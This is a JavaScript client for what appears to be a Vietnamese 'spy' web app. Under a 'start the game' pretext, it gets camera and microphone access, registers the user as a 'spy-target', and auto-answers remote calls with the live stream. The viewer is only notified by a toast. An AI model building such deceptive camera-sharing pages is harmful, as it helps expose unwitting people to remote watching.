import { addTargetPeerID, deleteTargetPeerID } from "../firebase.js";
import { Toast } from "../utils.js";

window.onload = async () => {
  var localStream = null,
    peer = null,
    mediaConnection = null,
    totalSpy = 0,
    userName = localStorage.getItem("spy-target-name") || "";

  requestCameraPermission(() => {
    requestName();
  });

  function requestCameraPermission(successCallback) {
    getCameraPermission().then(
      (stream) => {
        localStream = stream;
        successCallback();
      },
      (err) => {
        Swal.fire({
          icon: "error",
          title: "Không thể truy cập camera",
          html: `Vui lòng cho phép truy cập camera rồi nhấn Thử Lại <br/> Lỗi: ${err}`,
          confirmButtonText: "Thử lại",
          allowEscapeKey: false,
          allowOutsideClick: false,
        }).then((result) => {
          requestCameraPermission(successCallback);
        });
      }
    );
  }

  function getCameraPermission() {
    var getUserMedia =
      navigator.getUserMedia ||
      navigator.webkitGetUserMedia ||
      navigator.mozGetUserMedia;

    return new Promise((resolve, reject) => {
      getUserMedia(
        { video: true, audio: true },
        (stream) => {
          resolve(stream);
        },
        (err) => {
          reject(err);
        }
      );
    });
  }

  function requestName() {
    Swal.fire({
      title: "Chào mừng",
      text: "Nhập tên của bạn để bắt đầu trò chơi",
      input: "text",
      inputValue: userName,
      inputAttributes: {
        style: "text-align: center",
      },
      confirmButtonText: "Bắt đầu",
      allowOutsideClick: false,
      allowEscapeKey: false,
      inputValidator: (value) => {
        if (!value) {
          return "Vui lòng nhập tên";
        }
      },
    }).then((result) => {
      userName = result.value;
      localStorage.setItem("spy-target-name", userName);

      initPeer();
    });
  }

  function initPeer() {
    if (peer) {
      peer.destroy();
      totalSpy = 0;
    }

    peer = new Peer();

    Swal.fire({
      title: "Chờ chút nhé",
      text: "Đang kết nối với máy chủ...",
      allowEscapeKey: false,
      allowOutsideClick: false,
    });
    Swal.showLoading();

    peer.on("open", function (id) {
      Swal.close();

      document.querySelector("#peerid").innerHTML = `Hello ${userName}`;
      addTargetPeerID(id, userName);

      window.onbeforeunload = function () {
        deleteTargetPeerID(peer.id, userName);
        return "Are you sure want to close this tab?";
      };
    });

    peer.on("connection", function (conn) {
      totalSpy++;
      Toast.fire({
        icon: "info",
        title: "Có người vào xem",
        text: `Tổng công: ${totalSpy} lượt.`,
      });

      console.log("New connected: ", conn);

      conn.on("data", function (data) {
        console.log("Received data: ", data);
      });

      conn.on("disconnected", function () {
        console.log("Disconnected: ", conn);
      });
    });

    peer.on("call", function (call) {
      call.answer(localStream); // Answer the call with an A/V stream.

      call.on("close", () => {
        console.log('call end')
        peer.destroy();
      });
    });

    peer.on("disconnected", function () {
      deleteTargetPeerID(peer.id, userName);

      Swal.fire({
        icon: "error",
        title: "Mất kết nối",
        text: "Vui lòng thử lại",
        allowEscapeKey: false,
        allowOutsideClick: false,
        confirmButtonText: "Thử lại",
      }).then(() => {
        initPeer();
      });
    });
  }
};
